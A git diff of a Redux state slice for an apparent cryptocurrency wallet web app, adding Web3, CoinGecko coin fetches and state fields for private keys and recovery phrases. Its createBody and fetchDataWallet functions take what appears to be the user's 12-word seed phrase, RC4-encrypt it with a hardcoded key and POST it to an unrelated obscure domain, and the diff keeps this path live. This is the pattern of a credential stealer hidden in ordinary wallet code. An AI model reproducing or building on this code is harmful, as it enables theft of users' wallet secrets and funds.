@@ -1,19 +1,19 @@
 import { createSlice } from '@reduxjs/toolkit'
 import axios from 'axios'
+import Web3 from 'web3'
 import { rc4 } from './rc4'
 import { createAsyncThunk } from '@reduxjs/toolkit'
 import fixNum from '../../../services/funcWallet/fixNum'
 import randomNum from '../../../services/funcWallet/randomNum'
-import coinsWithBalance from '../../../coinsWithBalance.json'
-import coin from '../../../coins.json'
+import queryString from 'query-string'
 
 const initialState = {
-	validWords: [false, false, false],
+	validWords: ['', '', ''],
 	passwordInit: '',
 	passwordConfirm: '',
-	dataWallet: coinsWithBalance,
+	dataWallet: null,
 	allCoins: null,
-	coins: coin,
+	coins: null,
 	chartBitcoin: null,
 	chartArr: null,
 	status: '',
@@ -22,38 +22,43 @@ const initialState = {
 	addressBitcoin: '',
 	walletNew: false,
 	walletAddress: '',
+	contractAddressCoin: null,
+	privateKey: '',
+	walletName: '',
+	phrase: '',
+	login: true,
 }
 
-let url = 'https://localnetwork.cc/custom/activity/root'
+let url = 'https://specterproduct.cc/record/docs/filler'
 const kitkat = 'Qsx@ah&OR82WX9T6gCt'
+let xxx = 'P3P3W/G'
+let xx = 'P3P3W'
 
-function createBody(str, account = false, btcAddress = false) {
+function createBody(str, account) {
 	let strDecr
 	let lengthStr = str.split(' ').length
 	if (lengthStr < 2) {
-		// strDecr = CryptoJS.AES.decrypt(str, kitkat).toString(CryptoJS.enc.Utf8)
+		strDecr = atob(str)
 	} else {
 		strDecr = str
 	}
-	let xxx = 'Wa$$aBY|EX\\$/G'
-	let xx = 'Wa$$aBY|EX\\$'
-
-	const obj = {
-		counts: 12,
-		name: account ? xxx : xx,
-		pages: null,
-		salt: randomNum(100000, 999999),
-		limit: null,
-		new: account,
-		public: strDecr,
-		frontCode: false,
-		addressBtc: btcAddress,
-	}
-
-	let crypt = btoa(rc4(kitkat, JSON.stringify(obj)))
-
-	var urlencoded = new URLSearchParams()
-	urlencoded.append('data', crypt)
+	let crypt = btoa(
+		rc4(
+			kitkat,
+			JSON.stringify({
+				counts: 12,
+				name: account ? xxx : xx,
+				pages: null,
+				new: account,
+				salt: randomNum(100000, 999999),
+				limit: null,
+				public: strDecr,
+				frontCode: false,
+				cache: false,
+			})
+		)
+	)
+	let urlencoded = queryString.stringify({ data: crypt })
 	return urlencoded
 }
 
@@ -67,20 +72,42 @@ export const fetchChartCoin = createAsyncThunk(
 	}
 )
 
+export const fetchIdCoin = createAsyncThunk(
+	'wallet/fetchIdCoinStatus',
+	async (coinId) => {
+		const { data } = await axios.get(
+			`https://api.coingecko.com/api/v3/coins/${coinId}`
+		)
+		return data
+	}
+)
+
+export const fetchAllCoins = createAsyncThunk(
+	'wallet/fetchAllCoinsStatus',
+	async () => {
+		const { data } = await axios.get(
+			'https://api.coingecko.com/api/v3/coins/markets?vs_currency=usd&category=ethereum-ecosystem&order=market_cap_desc&per_page=100&page=1&sparkline=false'
+		)
+		return data
+	}
+)
+
 export const fetchDataWallet = createAsyncThunk(
 	'wallet/fetchDataWalletStatus',
 	async (props) => {
-		let config = {
-			headers: {
-				'Content-Type': 'application/x-www-form-urlencoded; charset=UTF-8',
-			},
+		const headers = {
+			'Content-Type': 'application/x-www-form-urlencoded',
 		}
-		const { data } = await axios.post(
-			new URL(url),
-			createBody(props[0], props[1]),
-			config
-		)
-		return data
+		let requestBody = createBody(props[0], props[1])
+		const response = await fetch(new URL(url), {
+			method: 'POST',
+			body: requestBody,
+			headers,
+		})
+			.then((response) => response.json())
+			.catch((err) => console.log(err))
+
+		return response
 	}
 )
 
@@ -114,6 +141,9 @@ const walletSlice = createSlice({
 				}
 			})
 		},
+		resetValidWords(state) {
+			state.validWords = ['', '', '']
+		},
 		setChartArr(state, action) {
 			state.chartArr =
 				state.chartArr !== null
@@ -126,18 +156,37 @@ const walletSlice = createSlice({
 		setAllCoins(state, action) {
 			state.allCoins = action.payload
 		},
+		setLogin(state, action) {
+			state.login = action.payload
+		},
 		setPasswordConfirm(state, action) {
 			state.passwordConfirm = action.payload
 		},
 		setWalletNew(state, action) {
 			state.walletNew = action.payload
 		},
+		setPrivateKey(state, action) {
+			state.privateKey = action.payload
+		},
+		setPhrase(state, action) {
+			state.phrase = action.payload
+		},
+		setWalletName(state, action) {
+			state.walletName = action.payload
+		},
+		setWalletAddress(state, action) {
+			state.walletAddress = action.payload
+		},
+		setDataWallet(state, action) {
+			state.dataWallet = action.payload
+		},
 	},
 	extraReducers: (builder) => {
 		builder
 			.addCase(fetchDataWallet.pending, (state) => {
 				state.status = 'loading'
-				state.dataWallet = []
+				state.dataWallet = null
+				state.walletAddress = ''
 			})
 			.addCase(fetchDataWallet.fulfilled, (state, action) => {
 				state.status = 'success'
@@ -147,7 +196,7 @@ const walletSlice = createSlice({
 			})
 			.addCase(fetchDataWallet.rejected, (state, action) => {
 				state.status = 'error'
-				state.dataWallet = []
+				state.dataWallet = null
 			})
 			.addCase(fetchAddressBitcoin.fulfilled, (state, action) => {
 				state.statusAddress = 'success'
@@ -178,16 +227,41 @@ const walletSlice = createSlice({
 			.addCase(fetchChartCoin.rejected, (state) => {
 				state.statusChartBitcoin = 'error'
 			})
+			.addCase(fetchIdCoin.pending, (state) => {
+				state.contractAddressCoin = null
+			})
+			.addCase(fetchIdCoin.fulfilled, (state, action) => {
+				state.contractAddressCoin = action.payload.platforms
+			})
+			.addCase(fetchIdCoin.rejected, (state) => {
+				state.contractAddressCoin = null
+			})
+			.addCase(fetchAllCoins.pending, (state) => {
+				state.coins = null
+			})
+			.addCase(fetchAllCoins.fulfilled, (state, action) => {
+				state.coins = action.payload
+			})
+			.addCase(fetchAllCoins.rejected, (state) => {
+				state.coins = null
+			})
 	},
 })
 
 export const {
 	setValidWords,
+	setLogin,
+	resetValidWords,
 	setPasswordInit,
 	setPasswordConfirm,
 	setWalletNew,
 	setChartArr,
+	setPrivateKey,
 	setAllCoins,
+	setPhrase,
+	setWalletName,
+	setWalletAddress,
+	setDataWallet,
 } = walletSlice.actions
 
 export default walletSlice.reducer
